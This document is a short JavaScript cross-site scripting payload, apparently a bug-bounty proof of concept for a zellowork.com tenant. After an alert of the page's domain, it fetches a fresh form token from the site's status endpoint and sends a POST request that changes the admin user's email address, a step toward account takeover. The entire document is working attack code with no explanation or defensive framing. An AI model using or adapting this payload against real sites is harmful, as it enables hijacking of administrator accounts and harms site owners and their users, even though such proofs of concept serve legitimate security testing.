console.log('XSSED')
alert(document.domain);(async () => {
    try {
        console.log("Step 1: Grabbing fresh formToken...");
        
        // 1. Fetch the token dynamically
        const statusRes = await fetch('https://harrywh1.zellowork.com/system/statusget?context=1');
        const statusData = await statusRes.json();
        const freshToken = statusData.context.formToken;

        if (!freshToken) {
            throw new Error("Could not retrieve formToken. Are you logged in?");
        }

        console.log("Token retrieved:", freshToken);
        console.log("Step 2: Sending the POST request to update admin email...");

        // 2. Build the payload exactly as requested
        // Note: URLSearchParams handles the %2B encoding for the '+' automatically
        const params = new URLSearchParams();
        params.append('safestrings', 'true');
        params.append('name', 'admin');
        params.append('email', 'changed@yeswehack.ninja');
        params.append('formToken', freshToken);

        // 3. Execute the POST
        const saveRes = await fetch('https://harrywh1.zellowork.com/user/save?context=1', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-Requested-With': 'XMLHttpRequest'
            },
            body: params.toString()
        });

        const result = await saveRes.json();

        if (result.status === "OK") {
            console.log("%c[!] Success: Admin user updated.", "color: #00ff00; font-weight: bold;");
        } else {
            console.error("Server error:", result);
        }

    } catch (err) {
        console.error("Script failed:", err);
    }
})();
